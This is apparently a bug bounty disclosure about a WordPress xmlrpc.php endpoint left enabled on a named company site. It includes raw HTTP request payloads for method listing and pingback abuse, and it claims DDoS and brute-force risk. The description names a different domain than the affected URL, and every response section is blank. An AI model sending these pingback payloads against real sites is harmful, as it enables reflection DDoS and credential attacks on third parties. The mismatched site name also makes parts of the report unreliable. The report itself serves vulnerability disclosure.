Hi,

### Description
Wordpress that have xmlrpc.php enabled for pingbacks, trackbacks, etc. can be made as a part of a huge botnet causing a major DDOS. The website https://www.lahitapiolarahoitus.fi has the xmlrpc.php file enabled and could thus be potentially used for such an attack against other victim hosts.

### Affected URL
- https://ux.visma.com/xmlrpc.php

### Step to reproduce

1. Intercept https://ux.visma.com/xmlrpc.php

**list of methods**
```
POST /xmlrpc.php HTTP/1.1
Host: ux.visma.com
Accept: */*
Accept-Language: en
Connection: close
Content-Length: 131

<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
**Response**


**Pingback**
```
POST /xmlrpc.php HTTP/1.1
Host: ux.visma.com
Accept: */*
Accept-Language: en
Connection: close
Content-Length: 285

<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>https://hackerone.com/</string></value>
</param>
<param>
<value><string>https://ux.visma.com/homepage</string></value>
</param>
</params>
</methodCall>
```
**Response**


**Say Hello**
```
POST /xmlrpc.php HTTP/1.1
Host: ux.visma.com
Accept: */*
Accept-Language: en
Connection: close
Content-Length: 90

<?xml version="1.0"?>
<methodCall>
<methodName>demo.sayHello</methodName>
</methodCall>
```
**Response**


### Impact
This can be automated from multiple hosts and be used to cause a mass DDOS attack on the victim.
this method is also used for brute force attacks to stealing the admin credentials and other important credentials

### Reference
- https://hackerone.com/reports/325040

Let me know if you have any questions.


Thanks,
-- 
Rudra Sarkar | Security Researcher
@rudr4_sarkar
